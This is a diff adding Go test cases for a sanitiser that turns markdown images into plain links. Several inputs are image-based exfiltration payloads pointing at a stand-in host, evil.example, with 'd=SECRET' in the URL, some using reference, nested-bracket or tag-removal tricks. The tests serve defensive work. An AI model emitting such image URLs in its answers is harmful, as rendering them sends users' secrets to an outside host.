@@ -24,6 +24,14 @@ func TestSanitiseAnswer(t *testing.T) {
 		{"autolink kept", "see <https://example.org/x>", "see <https://example.org/x>"},
 		{"less-than kept", "1 < 2 and 3 > 2", "1 < 2 and 3 > 2"},
 		{"code span kept", "use `a<b`", "use `a<b`"},
+		{"escaped bracket in alt", `![x\]](https://evil.example/b?d=SECRET)`, `[x\]](https://evil.example/b?d=SECRET)`},
+		{"nested brackets in alt", "![a [b] c](https://evil.example/b?d=SECRET)", "[a [b] c](https://evil.example/b?d=SECRET)"},
+		{"reference image", "![a][r]\n\n[r]: https://evil.example/b?d=SECRET", "[a][r]\n\n[r]: https://evil.example/b?d=SECRET"},
+		{"shortcut reference image", "![r]\n\n[r]: https://evil.example/b?d=SECRET", "[r]\n\n[r]: https://evil.example/b?d=SECRET"},
+		{"collapsed reference image", "![r][]\n\n[r]: https://evil.example/b", "[r][]\n\n[r]: https://evil.example/b"},
+		{"repeated bangs", "!!![x](https://evil.example/b)", "[x](https://evil.example/b)"},
+		{"image rejoined by tag removal", "!<b></b>[x](https://evil.example/b)", "[x](https://evil.example/b)"},
+		{"exclamation kept", "Wow! [link](https://a.example)", "Wow! [link](https://a.example)"},
 	} {
 		t.Run(tt.name, func(t *testing.T) {
 			if got := sanitiseAnswer(tt.in); got != tt.want {
